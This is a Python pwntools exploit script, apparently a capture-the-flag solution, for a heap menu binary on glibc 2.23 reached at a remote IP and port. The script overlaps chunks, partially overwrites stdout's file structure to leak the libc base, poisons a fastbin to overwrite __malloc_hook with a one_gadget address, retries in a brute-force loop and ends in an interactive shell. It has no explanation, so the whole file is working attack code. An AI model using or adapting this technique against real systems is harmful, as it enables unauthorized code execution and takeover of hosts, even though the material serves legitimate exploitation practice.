from pwn import*
def add(size,text):
	p.sendlineafter('choice:','1')
	p.sendlineafter('item name:',str(size))
	p.sendafter('item:',text)
def edit(index,size,text):
	p.sendlineafter('choice:','2')
	p.sendlineafter('item:',str(index))
	p.sendlineafter('name:',str(size))
	p.sendafter('item:',text)
def free(index):
	p.sendlineafter('choice:','3')
	p.sendafter('item:',str(index))
p = remote('121.36.215.224',9998)
libc = ELF('./libc-2.23.so',checksec=False)
#context.log_level ='debug'
while True:
	try:
		p = remote('121.36.215.224',9998)
		add(0x10,'\n')
		add(0x10,'\n')
		add(0x58,'\n')
		add(0x68,'\n')
		add(0x20,'\n')
		add(0x10,'\n')
		edit(1,0x20,'\x00'*0x18+p64(0x101))
		free(2)
		free(2)
		add(0x58,'\n')
		add(0x28,'\n')
		edit(0,0x70,'\x00'*0x58+p64(0x71)+'\xDD\x55')
		add(0x68,'\n')
		add(0x68,'\x00'*0x33+p64(0xFBAD1800)+p64(0)*3+'\x88')
		libc_base=u64(p.recv(6).ljust(8,'\x00'))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		og = [0x45216,0x4526A,0xF02A4,0xF1147]
		add(0x68,'\n')
		free(6)
		edit(0,0x100,'\x00'*0x28+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,'\n')
		add(0x68,'\x00'*0x13+p64(og[2]+libc_base))
		p.sendlineafter('Your choice:','4')
		break
	except:
		p.close()
		continue
p.interactive()

